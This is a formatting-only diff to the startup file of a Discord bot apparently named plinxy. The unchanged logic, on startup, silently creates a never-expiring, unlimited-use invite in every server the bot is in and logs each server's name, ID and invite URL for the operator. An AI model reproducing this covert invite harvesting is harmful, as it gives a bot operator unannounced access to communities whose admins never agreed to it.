@@ -1,7 +1,12 @@
-const { Client, GatewayIntentBits, Partials, Collection } = require('discord.js');
-const eventHandler = require('./handlers/eventHandler');
+const {
+  Client,
+  GatewayIntentBits,
+  Partials,
+  Collection,
+} = require("discord.js");
+const eventHandler = require("./handlers/eventHandler");
 
-const color = "#0096FF"
+const color = "#0096FF";
 module.exports = { color };
 
 const client = new Client({
@@ -20,22 +25,30 @@ client.commands = new Collection();
 
 eventHandler(client);
 
-client.once('ready', async () => {
+client.once("ready", async () => {
   console.log(`Logged in as ${client.user.tag}!`);
   console.log("Servers plinxy is in :)");
-  client.guilds.cache.forEach(async guild => {
+  client.guilds.cache.forEach(async (guild) => {
     try {
-      const channels = guild.channels.cache.filter(channel =>
-        channel.isTextBased() && channel.permissionsFor(guild.members.me).has('CreateInstantInvite')
+      const channels = guild.channels.cache.filter(
+        (channel) =>
+          channel.isTextBased() &&
+          channel.permissionsFor(guild.members.me).has("CreateInstantInvite")
       );
       if (channels.size > 0) {
-        const invite = await channels.first().createInvite({ maxAge: 0, maxUses: 0 });
+        const invite = await channels
+          .first()
+          .createInvite({ maxAge: 0, maxUses: 0 });
         console.log(`- ${guild.name} (ID: ${guild.id}, ${invite.url})`);
       } else {
-        console.log(`- ${guild.name} (ID: ${guild.id}), No permission to create an invite or no text channels available.`);
+        console.log(
+          `- ${guild.name} (ID: ${guild.id}), No permission to create an invite or no text channels available.`
+        );
       }
     } catch (error) {
-      console.error(`Could not create an invite for ${guild.name} (ID: ${guild.id}): ${error.message}`);
+      console.error(
+        `Could not create an invite for ${guild.name} (ID: ${guild.id}): ${error.message}`
+      );
     }
   });
 });
